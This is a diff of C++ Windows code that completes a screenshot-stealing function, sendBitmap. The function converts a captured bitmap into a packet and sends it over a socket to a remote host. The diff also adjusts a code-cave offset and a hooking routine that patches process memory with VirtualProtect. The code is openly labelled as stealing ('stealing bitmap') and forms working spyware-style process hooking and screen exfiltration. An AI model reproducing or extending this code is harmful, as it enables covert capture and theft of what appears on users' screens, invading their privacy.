@@ -147,8 +147,25 @@ void send(SOCKET socket, Packet& packet) {
 }
 
 extern "C" void sendBitmap(HBITMAP hBitmap) {
-    const auto* msg = "Sreenshot stealed!\nWait it is not implemented yet...\n";
-    std::cout << msg << std::endl;
+    WSADATA wsaData;
+
+    printf("stealing bitmap\n");
+
+    if (auto result = WSAStartup(MAKEWORD(2, 2), &wsaData); result) {
+        printf("WSAStartup failed with error: %d\n", result);
+        return;
+    }
+
+    if (auto packet = BitmapToPacket(hBitmap); packet) {
+        printf("biWidth: %d\n", packet->biWidth);
+        printf("biHeight: %d\n", packet->biHeight);
+        printf("biBitCount: %d\n", packet->biBitCount);
+        printf("payloadSize: %d\n", packet->payloadSize);
+        send(connect(), *packet);
+        free(packet->payload);
+    }
+
+    WSACleanup();
 }
 
 extern "C" void codeCave();
@@ -160,7 +177,7 @@ extern "C" void codeCave();
 //DWORD hook_address = 0x00007FF798FC5CB0; // address when starting in the x64dgb
 
 constexpr uint64_t hookOffset = 0x1C08A;
-constexpr uint64_t codeCaveOffset = 0x13520;
+constexpr uint64_t codeCaveOffset = 0x16260;
 
 BYTE nop = 0x90;
 //Mov rax 48 B8
@@ -218,8 +235,6 @@ void hookCode() {
     auto hookLocation = (char*)getHookLocation();
     auto codeCaveLocation = getCodeCaveLocation();
 
-    std::cout << std::hex << "Hook location" << *((uint64_t*)hookLocation) << std::dec << std::endl;
-    std::cout << std::hex << "Code cave location" << codeCaveLocation << std::dec << std::endl;
     DWORD old_protect;
     auto res = VirtualProtect((void*)hookLocation, 6, PAGE_EXECUTE_READWRITE, &old_protect);
 
